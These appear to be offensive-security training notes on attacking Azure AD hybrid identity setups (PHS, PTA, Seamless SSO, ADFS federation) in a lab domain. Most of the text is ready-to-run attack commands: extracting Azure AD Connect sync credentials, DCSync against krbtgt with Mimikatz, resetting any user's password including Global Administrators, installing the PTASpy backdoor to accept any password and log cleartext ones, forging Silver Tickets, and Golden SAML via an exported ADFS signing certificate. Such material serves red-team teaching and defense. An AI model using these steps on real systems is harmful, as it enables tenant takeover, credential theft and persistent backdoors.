# Hybrid Identity


- Organizations have resources, devices and applications both on- premises and in the cloud.
- Many enterprises use their on-prem AD identities to access Azure applications to avoid managing separate identities on both.
- "A single user identity for authentication and authorization to all resources, regardless of locationâ€¦is hybrid identity."


## Hybrid Identity - Azure AD Connect




- An on-premises AD can be integrated with Azure AD using Azure AD Connect with the following methods. Every method supports Single Sign-on (SSO):
  - Password Hash Sync (PHS)
  - Pass-Through Authentication (PTA)
  - Federation

- For each method, at least the user synchronization is done and an account MSOL_<installationidentifier> is created on the on-prem AD.


## Hybrid Identity - PHS


- It synchronizes users and a hash of their password hashes (not clear-text or original hashes) from on-prem AD to Azure AD.
- The simplest and most popular method for getting a hybrid identity.
- PHS is required for features like Identity Protection and AAD Domain Services.
- Hash synchronization takes place every two minutes.
- When a user tries to access any Azure resource, the authentication takes place on Azure AD.
- Built-in security groups are not synced.
- By default, password expiry and account expiry are not reflected in Azure AD.
That means a user whose on-prem password is expired (not changed) can continue to access Azure resources using the old password.

#### Hybrid Identity - PHS - Abuse


- When PHS is configured :

- An account with name MSOL_<installationID> is automatically created in on- prem AD. For example, MSOL_782bef6aa0a9. This account has replication (DCSync) permissions in the on-prem AD.
- An account Sync_<name of on-prem ADConnect Server>_installationID is created in Azure AD. For example, Sync_DEFENG-ADCNCT_782bef6aa0a9. This account can reset password of ANY user (synced or cloud only) in Azure AD.
- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.

#### Lateral Movement - PHS

- You can enumerate the server where Azure AD connect is installed using the following on-prem enumeration (assuming that the server is domain joined - which is the Microsoft recommended method)
- Using the ActiveDirectory module:
```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
```

- Or from Azure AD (below command uses the Azure AD module)
```
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

#### Lateral Movement - PHS - On-Prem Dominance


- Once the Azure AD connect server is compromised. Use the below commands from the AADInternals module to extract credentials.
```
Get-AADIntSyncCredentials
```



- Using the creds of MSOL_* account, we can run DCSync against the on-prem AD
```
runas /netonly /user:defeng.corp\MSOL_782bef6aa0a9 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:defeng\krbtgt /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```

Lateral Movement - PHS - On-Prem to Cloud


- Using the creds of Sync_* account, we can reset password for any user (including Global Administrators and even the user who created the tenant).
- Using the creds, request an access token for AADGraph and save it to cache
```
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential ("Sync_DEFENG- ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
```

- Next, enumerate the Global Admins
```
Get-AADIntGlobalAdmins
```

- To reset the password of an on-prem user that is synced to Azure AD we need the ImmutableId (Unique Identifier derived from on-prem GUID) for the user
```
Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
```

- Finally, reset the user's password.
```
Set-AADIntUserPassword -SourceAnchor "E2gG19HA4EaDe0+3LkcS5g==" - Password "SuperSecretpass#12321" -Verbose
```
- You can now access any Azure AD resource (like Azure portal) using the new password. For on-prem resources, the old password can be used.

- To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
```
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
```
- The CloudAnchor is of the format USER_ObjectID.
- Finally, reset the user's password.
```
Set-AADIntUserPassword -CloudAnchor "User_10caa362-7d18-48c9- a45b-9c3a78f3a96b" -Password "SuperSecretpass#12321" -Verbose
```
- You can now access any Azure AD resource (like Azure portal) using the new password.




## Hybrid Identity - PTA




- No password hash synchronization of any form to the cloud takes place in PTA but Identity synchronization still takes place.
- Useful in enforcing on-prem password policies as the authentication is validated on-prem. The communication with cloud is done by an authentication agent and not the on-prem DC.
- Only outbound communication (Ports 80 and 443) from the authentication agent to Azure AD.


- The Authentication Agent communicates to Azure AD on behalf of on- prem DC. If we can compromise the authentication agent, it is possible to verify authentications for ANY synced user even if the password is wrong!

- That is, you just need valid userPrincipalName and use any password with that! Skeleton key attack for Azure AD!

- On the other hand, if we can compromise a Global Administrator, we can install an authentication agent in our own infrastructure that will authorize all login attempts.


### Lateral Movement- PTA - On-Prem to Cloud



- Once we have admin access to an Azure AD Connect server running PTA agent, run the following command from AADInternals to insert a backdoor. (Needs to be run as Administrator and needs VC++)
```
Install-AADIntPTASpy
```


- Once the backdoor is installed, we can authenticate as any user synced from on- prem without knowing the correct password!
- Also, it is possible to see the correct password of on-prem users authenticating on the cloud using the below command on the machine where the backdoor is installed
```
Get-AADIntPTASpyLog -DecodePasswords
```
- The DLL used for injection and passwords are stored, by default, in a hidden directory ```C:\PTASpy```



- We can register a new PTA agent after getting GA privileges by setting it on an attacker controlled machine. Once the agent is setup, we can repeat the previous steps to authenticate using any password and also, get the passwords in clear-text
```
Install-AADIntPTASpy
```



- Once the backdoor is installed, we can authenticate as any user synced from on- prem without knowing the correct password!

- Also, it is possible to see the correct password of on-prem users authenticating on the cloud using the below command on the machine where the backdoor is installed
```
Get-AADIntPTASpyLog -DecodePasswords
```


## Hybrid Identity - Seamless SSO




- Azure AD Seamless SSO automatically signs users in when they are on on- prem domain-joined machine. There is no need to use passwords to log in to Azure AD and on-prem applications.
- Supported by both PHS and PTA.
- When Seamless SSO is enabled, a computer account AZUREADSSOACC is created in the on-prem AD. This account's Kerberos decryption key is shared with Azure AD.
- Azure AD exposes an endpoint (https://autologon.microsoftazuread-sso.com) that accepts Kerberos tickets. Domain-joined machine's browser forwards the tickets to this endpoint for SSO.

#### Persistence - AZUREADSSOACC - On-Prem to Cloud


-  Password/key of the AZUREADSSOACC never changes.
-  If we can compromise the NTLM hash of the AZUREADSSOACC machine account, we can create Silver Tickets for any synced on-prem user!
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:defeng\azureadssoacc$ /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```

-  We just need the userPrincipalName and SID of the user to create the Silver ticket that can be used from any machine connected to the internet
```
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin1 /sid:S-1-5-21-938785110-3291390659-577725712 /id:1108 /domain:defeng.corp /rc4:<> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
```

-  Our lab environment (for both PHS and PTA) uses different UPN prefixes for on-prem and Azure domain so the SSO will not work ;)

## Hybrid Identity - Federation

- In case of federation, a trust is established between unrelated parties like on-prem Active Directory and Azure AD.
- In Federation, all authentication occurs in the on-prem environment and the user experiences SSO across all the trusted environments.
- Users can access cloud applications by using their on-prem credentials.
- In any federation setup there are three parties:
  - User or Client
  - Identity Provider (IdP)
  - Service Provider (SP)
- The identity provider authenticates the user and then the user can access a service on the service provider.
- Security Assertion Markup Language (SAML) is used for exchanging all the authentication and authorization information between the providers.



#### Hybrid Identity - Federation - ADFS

- AD FS is a claims-based identity model.
- ".. claims are simply statements (for example, name, identity, group), made about users, that are used primarily for authorizing access to claims-based applications located anywhere on the Internet."
- Claims for a user are written inside the SAML tokens and are then signed to provide integrity by the IdP.
- A user is identified by ImmutableID. It is globally unique and stored in Azure AD.
- The ImmuatbleID is stored on-prem as ms-DS-ConsistencyGuid for the user and/or can be derived from the GUID of the user.
- In ADFS, SAML Response is signed by a token-signing certificate.
- If the certificate is compromised, it is possible to authenticate to the Azure AD as ANY user in Azure AD!
- Just like our PTA abuse, password change for a user or MFA won't have any effect because we are forging the authentication response.
- The certificate can be extracted from the AD FS server with DA privileges and then can be used from any internet connected machine.
- This is what the infamous Golden SAML attacks is!


#### Lateral Movement - Federation - On-Prem to Cloud

- From any on-prem machine as a normal domain user, get the ImmutableID of the target user
```
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
```
- On AD FS server (as administrator)
```
Get-AdfsProperties |select identifier
```
- Check the IssuerURI from Azure AD too (Use MSOL module and need GA privs) Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

Note: When setting up the AD FS using Azure AD Connect, there is a difference between IssuerURI on ADFS server and Azure AD. Use the one from AzureAD.


- With DA privileges on-prem, we can extract the ADFS token signing certificate from the ADFS server using AADInternals
```
Export-AADIntADFSSigningCertificate
```
- Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified
```
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```

With DA privileges on-prem, it is possible to create ImmutableID of cloud only users with access to Azure AD Connect Sync credentials!

- Create a realistic ImmutableID and set it for a cloud only user
```
[System.Convert]::ToBase64String((New-Guid).tobytearray())

Set-AADIntAzureADObject -CloudAnchor "User_594e67c3-c39b-41bb-ac50- cd8cd8bb780f" -SourceAnchor "pwrtlmsicU+5tgCUgHx2tA=="
```

- Using AADInternals, export the token signing certificate
```
Export-AADIntADFSSigningCertificate
```
- Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified
```
Open-AADIntOffice365Portal -ImmutableID pwrtlmsicU+5tgCUgHx2tA== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
